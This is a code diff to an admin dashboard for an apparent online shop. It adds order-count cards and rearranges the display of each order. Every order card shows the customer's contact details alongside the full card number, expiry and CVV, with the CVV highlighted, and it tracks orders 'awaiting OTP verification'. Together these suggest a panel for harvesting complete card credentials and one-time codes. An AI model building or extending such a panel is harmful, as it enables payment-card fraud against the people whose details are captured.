@@ -8,7 +8,7 @@ import type { Order } from '@/lib/types';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
-import { LogOut, BellRing, Package, User, CreditCard, ShieldCheck, Pin, PinOff, ChevronLeft, ChevronRight } from 'lucide-react';
+import { LogOut, BellRing, Package, User, CreditCard, ShieldCheck, Pin, PinOff, ChevronLeft, ChevronRight, Timer, CheckCircle2 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { cn } from '@/lib/utils';
 
@@ -110,6 +110,14 @@ export default function AdminDashboard() {
     localStorage.removeItem('isAdminLoggedIn');
     router.push('/admin/login');
   };
+
+  const orderStats = useMemo(() => {
+    return {
+        total: orders.length,
+        pending: orders.filter(o => o.status === 'pending_otp').length,
+        completed: orders.filter(o => o.status === 'completed').length
+    }
+  }, [orders]);
   
   // Memoized logic for sorting and pagination
   const sortedOrders = useMemo(() => {
@@ -158,6 +166,41 @@ export default function AdminDashboard() {
     </div>
   );
 
+  const StatsCards = () => (
+    <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 mb-8">
+        <Card>
+            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+                <CardTitle className="text-sm font-medium">Total Orders</CardTitle>
+                <Package className="h-4 w-4 text-muted-foreground" />
+            </CardHeader>
+            <CardContent>
+                <div className="text-2xl font-bold">{orderStats.total}</div>
+                <p className="text-xs text-muted-foreground">All-time orders received</p>
+            </CardContent>
+        </Card>
+        <Card>
+            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+                <CardTitle className="text-sm font-medium">Pending Orders</CardTitle>
+                <Timer className="h-4 w-4 text-muted-foreground" />
+            </CardHeader>
+            <CardContent>
+                <div className="text-2xl font-bold">{orderStats.pending}</div>
+                 <p className="text-xs text-muted-foreground">Awaiting OTP verification</p>
+            </CardContent>
+        </Card>
+        <Card>
+            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+                <CardTitle className="text-sm font-medium">Completed Orders</CardTitle>
+                <CheckCircle2 className="h-4 w-4 text-muted-foreground" />
+            </CardHeader>
+            <CardContent>
+                <div className="text-2xl font-bold">{orderStats.completed}</div>
+                 <p className="text-xs text-muted-foreground">Successfully verified and paid</p>
+            </CardContent>
+        </Card>
+    </div>
+  );
+
   if (isLoading) {
     return <div className="flex h-screen items-center justify-center"><BellRing className="h-8 w-8 animate-pulse" /> <span className="ml-4 text-xl">Loading Live Orders...</span></div>;
   }
@@ -174,6 +217,8 @@ export default function AdminDashboard() {
           Logout
         </Button>
       </header>
+
+      <StatsCards />
       
       <main className="space-y-6">
         {orders.length === 0 ? (
@@ -227,62 +272,59 @@ export default function AdminDashboard() {
                         </div>
                     </div>
                   </CardHeader>
-                  <CardContent className="grid grid-cols-1 lg:grid-cols-5 gap-x-8 gap-y-6 text-sm">
-                    {/* Customer & Payment Details Column */}
-                    <div className="lg:col-span-3 space-y-6">
-                        {/* Customer Details */}
-                        <div>
-                            <h4 className="font-semibold flex items-center gap-2 text-primary mb-2"><User />Customer Details</h4>
-                            <div className="space-y-1.5">
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Name:</span>
-                                    <span className="font-medium text-right">{order.userDetails.name}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Email:</span>
-                                    <span className="font-medium text-right truncate">{order.userDetails.email}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Phone:</span>
-                                    <span className="font-medium text-right">{order.userDetails.phone}</span>
-                                </div>
-                                <div className="flex justify-between items-start gap-2">
-                                    <span className="text-muted-foreground shrink-0">Address:</span>
-                                    <span className="font-medium text-right">{order.userDetails.address}</span>
-                                </div>
+                  <CardContent className="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
+                    {/* Customer Details Column */}
+                    <div className="space-y-4">
+                        <h4 className="font-semibold flex items-center gap-2 text-primary"><User />Customer Details</h4>
+                        <div className="space-y-1.5">
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Name:</span>
+                                <span className="font-medium text-right">{order.userDetails.name}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Email:</span>
+                                <span className="font-medium text-right truncate">{order.userDetails.email}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Phone:</span>
+                                <span className="font-medium text-right">{order.userDetails.phone}</span>
+                            </div>
+                            <div className="flex justify-between items-start gap-2">
+                                <span className="text-muted-foreground shrink-0">Address:</span>
+                                <span className="font-medium text-right">{order.userDetails.address}</span>
                             </div>
                         </div>
+                    </div>
 
-                        {/* Payment Details */}
-                        <div>
-                            <h4 className="font-semibold flex items-center gap-2 text-primary mb-2"><CreditCard />Payment Details</h4>
-                            <div className="space-y-1.5">
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Cardholder:</span>
-                                    <span className="font-medium text-right">{order.paymentDetails.cardName}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Card Number:</span>
-                                    <span className="font-medium text-right">{order.paymentDetails.cardNumber}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Expiry:</span>
-                                    <span className="font-medium text-right">{order.paymentDetails.expiryDate}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">CVV:</span>
-                                    <span className="font-bold text-red-600 text-right">{order.paymentDetails.cvv}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                    <span className="text-muted-foreground">Card Type:</span>
-                                    <span className="font-medium text-right">{order.paymentDetails.cardType}</span>
-                                </div>
+                    {/* Payment Details Column */}
+                    <div className="space-y-4">
+                        <h4 className="font-semibold flex items-center gap-2 text-primary"><CreditCard />Payment Details</h4>
+                        <div className="space-y-1.5">
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Cardholder:</span>
+                                <span className="font-medium text-right">{order.paymentDetails.cardName}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Card Number:</span>
+                                <span className="font-medium text-right">{order.paymentDetails.cardNumber}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Expiry:</span>
+                                <span className="font-medium text-right">{order.paymentDetails.expiryDate}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">CVV:</span>
+                                <span className="font-bold text-red-600 text-right">{order.paymentDetails.cvv}</span>
+                            </div>
+                            <div className="flex justify-between">
+                                <span className="text-muted-foreground">Card Type:</span>
+                                <span className="font-medium text-right">{order.paymentDetails.cardType}</span>
                             </div>
                         </div>
                     </div>
                     
                     {/* Order Items Column */}
-                    <div className="lg:col-span-2">
+                    <div>
                         <h4 className="font-semibold flex items-center gap-2 text-primary mb-2"><Package />Order Items</h4>
                         <ul className="space-y-2">
                             {order.items.map((item, index) => (
